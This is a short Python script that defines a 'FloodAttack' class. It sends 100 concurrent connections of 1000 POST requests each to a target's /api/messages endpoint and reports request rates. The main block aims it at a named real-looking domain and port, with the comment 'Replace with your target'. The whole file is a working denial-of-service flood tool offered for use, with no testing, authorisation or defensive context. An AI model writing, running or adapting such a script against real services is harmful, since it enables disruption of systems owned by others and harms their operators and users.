import asyncio
import aiohttp
import json
from datetime import datetime

class FloodAttack:
    def __init__(self, target_url, num_connections=100, request_per_conn=1000):
        self.target_url = target_url
        self.num_connections = num_connections
        self.request_per_conn = request_per_conn
        self.total_requests = 0
        self.start_time = None

    async def make_requests(self, session, conn_id):
        """Make repeated requests on a single connection"""
        for i in range(self.request_per_conn):
            try:
                async with session.post(
                    f"{self.target_url}/api/messages",
                    json={
                        "message": "flood test",
                        "timestamp": str(datetime.now()),
                        "connection": conn_id,
                        "sequence": i
                    }
                ) as response:
                    self.total_requests += 1
                    if i % 100 == 0:
                        print(f"Connection {conn_id}: Made {i} requests")
                    await asyncio.sleep(0.01)
            except Exception as e:
                print(f"Error on connection {conn_id}: {str(e)}")
                continue

    async def run_attack(self):
        """Launch multiple connections making simultaneous requests"""
        self.start_time = datetime.now()
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(self.num_connections):
                tasks.append(self.make_requests(session, i))
            await asyncio.gather(*tasks)
        
        duration = (datetime.now() - self.start_time).total_seconds()
        print(f"\nAttack Statistics:")
        print(f"Total Requests: {self.total_requests}")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Requests/second: {self.total_requests/duration:.2f}")

if __name__ == "__main__":
    target = "https://akshaynambly.info:5008"  # Replace with your target
    attack = FloodAttack(target)
    asyncio.run(attack.run_attack())